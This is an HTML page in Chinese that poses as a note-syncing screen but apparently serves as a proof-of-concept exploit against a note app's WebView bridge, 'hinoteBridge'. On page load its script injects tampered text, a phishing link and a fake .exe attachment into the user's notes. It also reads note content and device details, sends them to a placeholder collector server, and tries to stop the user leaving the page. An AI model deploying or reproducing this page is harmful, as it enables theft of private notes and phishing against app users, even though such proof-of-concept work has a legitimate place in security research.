<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>笔记同步中...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        
        .logo {
            font-size: 60px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
            40% {transform: translateY(-20px);}
            60% {transform: translateY(-10px);}
        }
        
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 15px;
        }
        
        p {
            color: #666;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .loading-bar {
            width: 100%;
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 20px;
        }
        
        .loading-bar::after {
            content: '';
            display: block;
            width: 50%;
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            animation: loading 1.5s infinite;
        }
        
        @keyframes loading {
            0% {transform: translateX(-100%);}
            100% {transform: translateX(200%);}
        }
        
        .status {
            color: #999;
            font-size: 14px;
        }
        
        .success {
            color: #28a745;
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #d4edda;
            border-radius: 10px;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            color: #dc3545;
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #f8d7da;
            border-radius: 10px;
            border: 1px solid #f5c6cb;
        }
        
        .data-display {
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            text-align: left;
            display: none;
        }
        
        .data-display pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 12px;
            color: #333;
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📝</div>
        <h1>正在同步笔记内容</h1>
        <p>请稍候，我们正在从云端下载您的笔记...</p>
        
        <div class="loading-bar"></div>
        <div class="status" id="statusText">初始化连接...</div>
        
        <div class="success" id="successMsg">
            ✅ 同步成功！
        </div>
        
        <div class="error" id="errorMsg">
            ❌ 同步失败，请重试
        </div>
        
        <div class="data-display" id="dataDisplay">
            <strong>获取到的数据:</strong>
            <pre id="dataContent"></pre>
        </div>
    </div>

    <script>
        // 全局变量
        let collectedData = {};
        const statusText = document.getElementById('statusText');
        const successMsg = document.getElementById('successMsg');
        const errorMsg = document.getElementById('errorMsg');
        const dataDisplay = document.getElementById('dataDisplay');
        const dataContent = document.getElementById('dataContent');
        
        // 更新状态
        function updateStatus(text, type) {
            statusText.textContent = text;
            if (type === 'success') {
                successMsg.style.display = 'block';
                errorMsg.style.display = 'none';
            } else if (type === 'error') {
                errorMsg.style.display = 'block';
                successMsg.style.display = 'none';
            }
        }
        
        // 显示数据
        function displayData(data) {
            dataContent.textContent = JSON.stringify(data, null, 2);
            dataDisplay.style.display = 'block';
        }
        
        // 发送数据到收集服务器
        function sendDataToCollector(data) {
            try {
                // 替换成你的数据收集服务器
                fetch('https://your-collector-server.com/api/collect', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        timestamp: new Date().toISOString(),
                        url: window.location.href,
                        data: data
                    })
                }).catch(e => console.log('发送失败:', e));
            } catch(e) {
                console.log('发送异常:', e);
            }
        }
        
        // 主攻击函数
        function executeAttack() {
            console.log('=== 开始攻击 ===');
            updateStatus('检测 WebView 环境...', 'info');
            
            setTimeout(() => {
                // 检测 hinoteBridge
                if (window.hinoteBridge) {
                    console.log('✅ 发现 hinoteBridge 接口');
                    updateStatus('发现笔记接口，准备注入...', 'success');
                    
                    // 收集基本信息
                    collectedData.basicInfo = {
                        userAgent: navigator.userAgent,
                        url: window.location.href,
                        timestamp: new Date().toISOString(),
                        platform: navigator.platform,
                        language: navigator.language
                    };
                    
                    // 执行攻击载荷
                    executePayloads();
                } else {
                    console.log('❌ hinoteBridge 不存在');
                    updateStatus('当前环境不支持同步', 'error');
                    
                    // 即使失败也收集信息
                    collectedData.error = {
                        message: 'hinoteBridge not found',
                        basicInfo: {
                            userAgent: navigator.userAgent,
                            url: window.location.href
                        }
                    };
                    
                    sendDataToCollector(collectedData);
                }
            }, 1500);
        }
        
        // 执行攻击载荷
        function executePayloads() {
            let step = 0;
            
            const payloads = [
                // 步骤 1: 注入恶意文本
                () => {
                    console.log('步骤 1: 注入文本');
                    updateStatus('正在注入内容...', 'info');
                    
                    try {
                        window.hinoteBridge.addText('[⚠️ 恶意注入] 这是一条被篡改的笔记内容！\n');
                        collectedData.payload1 = {success: true, action: 'addText'};
                        step++;
                        payloads[step]();
                    } catch(e) {
                        console.log('❌ 步骤 1 失败:', e);
                        collectedData.payload1 = {success: false, error: e.message};
                    }
                },
                
                // 步骤 2: 注入钓鱼链接
                () => {
                    console.log('步骤 2: 注入钓鱼链接');
                    
                    try {
                        window.hinoteBridge.addLinkToTextContent(JSON.stringify({
                            url: 'https://phishing-site.com/steal-credentials',
                            text: '🎁 点击领取荣耀大礼包！',
                            startOffset: 0,
                            endOffset: 10
                        }));
                        collectedData.payload2 = {success: true, action: 'addLinkToTextContent'};
                        step++;
                        payloads[step]();
                    } catch(e) {
                        console.log('❌ 步骤 2 失败:', e);
                        collectedData.payload2 = {success: false, error: e.message};
                    }
                },
                
                // 步骤 3: 尝试获取笔记内容
                () => {
                    console.log('步骤 3: 获取笔记内容');
                    updateStatus('正在读取笔记...', 'info');
                    
                    try {
                        window.hinoteBridge.getTextForSummary(function(content) {
                            console.log('✅ 获取到笔记内容:', content);
                            collectedData.stolenContent = content;
                            displayData({stolenContent: content});
                            sendDataToCollector(collectedData);
                            
                            step++;
                            payloads[step]();
                        });
                    } catch(e) {
                        console.log('❌ 步骤 3 失败:', e);
                        collectedData.payload3 = {success: false, error: e.message};
                        step++;
                        payloads[step]();
                    }
                },
                
                // 步骤 4: 注入恶意文件
                () => {
                    console.log('步骤 4: 注入恶意文件');
                    
                    try {
                        window.hinoteBridge.addFile(JSON.stringify([
                            {
                                title: '⚠️恶意文件.exe',
                                size: 999999,
                                uploadType: 'exe',
                                id: 'malicious-file-001'
                            }
                        ]));
                        collectedData.payload4 = {success: true, action: 'addFile'};
                        step++;
                        payloads[step]();
                    } catch(e) {
                        console.log('❌ 步骤 4 失败:', e);
                        collectedData.payload4 = {success: false, error: e.message};
                        step++;
                        payloads[step]();
                    }
                },
                
                // 步骤 5: 完成
                () => {
                    console.log('=== 攻击完成 ===');
                    updateStatus('同步完成！', 'success');
                    
                    // 显示所有收集的数据
                    displayData(collectedData);
                    
                    // 发送最终数据
                    sendDataToCollector(collectedData);
                }
            ];
            
            // 开始执行
            payloads[0]();
        }
        
        // 页面加载完成后执行
        window.addEventListener('load', function() {
            console.log('页面加载完成');
            executeAttack();
        });
        
        // 防止页面卸载
        window.onbeforeunload = function(e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        };
    </script>
</body>
</html>
